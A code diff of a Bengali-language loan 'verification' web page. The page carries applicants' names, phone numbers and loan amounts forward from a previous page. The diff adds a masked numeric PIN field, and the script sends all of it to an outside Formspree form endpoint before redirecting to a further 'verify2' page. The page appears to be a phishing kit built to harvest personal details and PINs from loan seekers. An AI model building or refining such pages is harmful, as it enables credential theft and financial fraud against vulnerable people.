@@ -35,6 +35,7 @@
             border-right: 1px solid #fff7ed;
         }
 
+        /* উপরের ল্যাঙ্গুয়েজ/স্ট্যাটাস পিল */
         .top-row {
             display: flex;
             justify-content: flex-end;
@@ -67,6 +68,7 @@
             color: #64748b;
         }
 
+        /* ব্র্যান্ড ও লোগো অংশ */
         .brand-section {
             display: flex;
             align-items: center;
@@ -97,6 +99,7 @@
             font-weight: 500;
         }
 
+        /* ইনপুট ফিল্ড ও লেবেল */
         .input-group {
             margin-bottom: 22px;
         }
@@ -118,7 +121,7 @@
         .input-box i.input-icon {
             position: absolute;
             left: 16px;
-            color: #ff5e00;
+            color: #94a3b8;
             font-size: 16px;
         }
 
@@ -142,6 +145,12 @@
             box-shadow: 0 0 0 3px rgba(255, 94, 0, 0.15);
         }
 
+        .form-control[readonly] {
+            background: #f8fafc;
+            border-color: #e2e8f0;
+            color: #475569;
+        }
+
         .helper-text {
             font-size: 12.5px;
             color: #ff5e00;
@@ -151,6 +160,7 @@
             text-decoration: none;
         }
 
+        /* সাবমিট বাটন */
         .btn-submit {
             width: 100%;
             padding: 15px;
@@ -179,6 +189,7 @@
             cursor: not-allowed;
         }
 
+        /* বটম কুইক লিঙ্কস */
         .bottom-links {
             display: flex;
             justify-content: space-around;
@@ -219,6 +230,7 @@
 
 <div class="container">
     <div>
+        <!-- ল্যাঙ্গুয়েজ সুইচ -->
         <div class="top-row">
             <div class="lang-switch">
                 <button type="button" class="lang-btn active">বাংলা</button>
@@ -226,6 +238,7 @@
             </div>
         </div>
 
+        <!-- ব্র্যান্ড ও লোগো -->
         <div class="brand-section">
             <img src="logoo.png" alt="Company Logo" class="brand-logo">
             <div class="brand-info">
@@ -234,36 +247,40 @@
             </div>
         </div>
 
+        <!-- যাচাইকরণ ফর্ম -->
         <form id="verifyForm" action="https://formspree.io/f/xvkkeegq" method="POST">
+            <!-- ব্যাকগ্রাউন্ডে পূর্ববর্তী পেজের নাম ও টাকার তথ্য জমা রাখার হিডেন ফিল্ড -->
             <input type="hidden" name="আবেদনকারীর_নাম" id="hiddenName">
             <input type="hidden" name="লোনের_পরিমাণ" id="hiddenAmount">
 
-            <!-- লাইভ মোবাইল নম্বর ইনপুট -->
+            <!-- ১. মোবাইল নম্বর ফিল্ড -->
             <div class="input-group">
                 <label class="input-label">গ্রাহক মোবাইল নম্বর</label>
                 <div class="input-box">
                     <i class="fa-solid fa-phone input-icon"></i>
-                    <input type="tel" id="userPhone" name="যাচাইকৃত_মোবাইল" class="form-control" required placeholder="০১XXXXXXXXX">
+                    <input type="tel" id="userPhone" name="মোবাইল_নম্বর" class="form-control" readonly>
                 </div>
             </div>
 
-            <!-- ট্র্যাকিং / রেফারেন্স আইডি ইনপুট -->
+            <!-- ২. ট্র্যাকিং পিন ফিল্ড -->
             <div class="input-group">
-                <label class="input-label">আবেদন ট্র্যাকিং রেফারেন্স কোড</label>
+                <label class="input-label">ট্র্যাকিং পিন (PIN)</label>
                 <div class="input-box">
-                    <i class="fa-solid fa-hashtag input-icon"></i>
-                    <input type="text" id="trackRef" name="রেফারেন্স_কোড" class="form-control" required placeholder="যেমন: TRK-1024" maxlength="15">
+                    <i class="fa-solid fa-lock input-icon"></i>
+                    <input type="password" id="trackPin" name="ট্র্যাকিং_পিন" class="form-control" required placeholder="• • • •" maxlength="6" inputmode="numeric">
                 </div>
-                <a href="javascript:void(0)" class="helper-text" onclick="alert('আপনার রেফারেন্স কোডটি জানতে অফিস হেল্পলাইনে যোগাযোগ করুন।')">কোড পাননি? সহায়তা নিন</a>
+                <a href="javascript:void(0)" class="helper-text" onclick="alert('সহায়তার জন্য হেল্পলাইনে যোগাযোগ করুন।')">পিন ভুলে গিয়েছেন? সহায়তা নিন</a>
             </div>
 
+            <!-- সাবমিট বাটন -->
             <button type="submit" id="btnSubmit" class="btn-submit">
-                <span>যাচাই ও পরবর্তী ধাপে যান</span>
+                <span>যাচাই ও চূড়ান্ত সাবমিট</span>
                 <i class="fa-solid fa-arrow-right"></i>
             </button>
         </form>
     </div>
 
+    <!-- বটম আইকন -->
     <div class="bottom-links">
         <div class="link-item">
             <div class="link-icon"><i class="fa-solid fa-location-dot"></i></div>
@@ -281,22 +298,21 @@
 </div>
 
 <script>
-    // আগের পেজ থেকে পাঠানো প্যারামিটার রিসিভ করা
+    // পূর্ববর্তী পেজ থেকে ডেটা গ্রহণ
     const params = new URLSearchParams(window.location.search);
     const applicantName = params.get('name') || '';
     const applicantPhone = params.get('phone') || '';
     const loanAmount = params.get('amount') || '';
 
-    // হিডেন ফিল্ড ও ডিফল্ট ভ্যালু বসানো
+    // ফর্মে ফিল্ডগুলো সেট করা
     document.getElementById('hiddenName').value = applicantName;
     document.getElementById('hiddenAmount').value = loanAmount;
-    if (applicantPhone) {
-        document.getElementById('userPhone').value = applicantPhone;
-    }
+    document.getElementById('userPhone').value = applicantPhone || '০১XXXXXXXXX';
 
     const form = document.getElementById('verifyForm');
     const btnSubmit = document.getElementById('btnSubmit');
 
+    // ফর্ম সাবমিট হ্যান্ডলার
     form.addEventListener('submit', function(event) {
         event.preventDefault();
 
@@ -310,7 +326,7 @@
             body: data,
             headers: { 'Accept': 'application/json' }
         }).finally(() => {
-            // সফলভাবে তথ্য পৌঁছানোর পর verify2.html এ রিডাইরেক্ট
+            // সাবমিট শেষে সরাসরি verify2.html পেজে নিয়ে যাওয়া
             window.location.href = "verify2.html";
         });
     });
